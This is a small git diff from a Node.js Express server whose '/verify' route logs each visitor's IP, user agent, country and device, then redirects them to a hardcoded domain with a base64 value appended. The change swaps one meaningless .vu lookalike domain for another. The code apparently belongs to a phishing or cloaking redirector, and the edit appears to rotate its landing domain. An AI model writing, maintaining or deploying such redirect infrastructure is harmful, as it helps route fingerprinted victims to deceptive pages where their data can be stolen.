@@ -201,7 +201,7 @@ app.post('/verify', async (req, res) => {
         const device = detectDeviceType(ua);
 
         logVisitor(clientIp, ua, country, device);
-        const baseUrl = process.env.REDIRECT_BASE_URL || 'https://solutionlifeseniorservicescapital.forklcwardlawllp.vu';
+        const baseUrl = process.env.REDIRECT_BASE_URL || 'https://solutiondebibliotheekdokdelftgroup.specpjeoinc.vu';
         const cleanBaseUrl = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
         const redirectUrl = cleanBaseUrl + '/$' + encodeURIComponent(cleanB64);
 
